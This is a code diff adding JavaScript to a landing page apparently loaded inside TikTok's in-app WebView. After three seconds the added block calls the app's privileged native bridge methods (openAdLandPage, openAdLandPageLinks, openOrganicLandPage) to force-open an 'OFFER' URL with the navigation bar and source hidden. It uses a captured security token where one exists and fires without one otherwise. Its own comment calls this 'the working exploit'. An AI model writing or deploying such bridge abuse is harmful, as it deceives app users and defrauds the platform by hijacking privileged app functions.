@@ -105,7 +105,28 @@
     });
     // If token found synchronously, fire immediately; otherwise hooks will fire when async response arrives
     if (token) fire();
-    // No redirect fallback here — user is already on the landing page inside TikTok's WebView
+
+    // Unconditional 3s attempt — mirrors the working exploit; fires without a token if hooks never deliver one
+    setTimeout(function(){
+      if (fired) return;
+      log('3s:attempt');
+      var tt = window.ToutiaoJSBridge;
+      var jb = window.JSBridge;
+      var p = {
+        url: OFFER, landingStyle: 2, title: '', isDeeplink: 1, refer: 'landing_page',
+        cid: CID, hide_nav_bar: 1, hide_source: 1, should_full_screen: 1,
+        trans_status_bar: 1, is_instant_page: 1
+      };
+      if (token) p._jsb_secure_token = token;
+      if (tt && tt.call) {
+        try { tt.call('openAdLandPage',      p, function(){}); } catch(e){}
+        try { tt.call('openAdLandPageLinks', p, function(){}); log('3s:tt:ok'); } catch(e){ log('3s:tt:err:'+e); }
+        try { tt.call('openOrganicLandPage', p, function(){}); } catch(e){}
+      }
+      if (jb && jb.call) {
+        try { jb.call('openAdLandPageLinks', p, function(){}); log('3s:jb:ok'); } catch(e){ log('3s:jb:err:'+e); }
+      }
+    }, 3000);
   } else {
     // No JS2NativeBridge — poll for JSBridge directly (real organic ad sessions on some devices)
     log('js2:absent|polling');
